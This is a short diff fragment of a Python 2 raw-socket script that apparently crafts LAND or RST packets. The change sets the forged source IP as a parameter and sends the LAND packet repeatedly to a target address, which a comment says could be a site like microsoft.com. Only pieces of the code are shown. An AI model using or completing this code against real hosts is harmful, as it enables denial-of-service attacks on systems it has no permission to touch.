@@ -31,10 +31,10 @@ try:
 except socket.error , msg:
     print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
     sys.exit()
-def land_pack():
+def land_pack(ipsrc):
     # ip_source = '127.0.0.1' #本机IP
     # ip_dest = '127.0.0.1'	#也可以用域名：socket.gethostbyname('www.microsoft.com')
-
+    ip_source = ipsrc
     #填写ip header
     ip_ver = 4			# ipv4
     ip_ihl = 5			# Header Length =5, 表示无options部分
@@ -114,10 +114,10 @@ def land_pack():
 
 def send_packet():
     n = SEND_TIMES
-    packet = rst_pack()
+    packet = land_pack(ip_source)
     for _ in range(n):
         if PACK_EVERY_TIME:
-            packet = rst_pack()
+            packet = land_pack(ip_source)
         s.sendto(packet, (ip_dest, 0))
 
 if __name__ == '__main__':
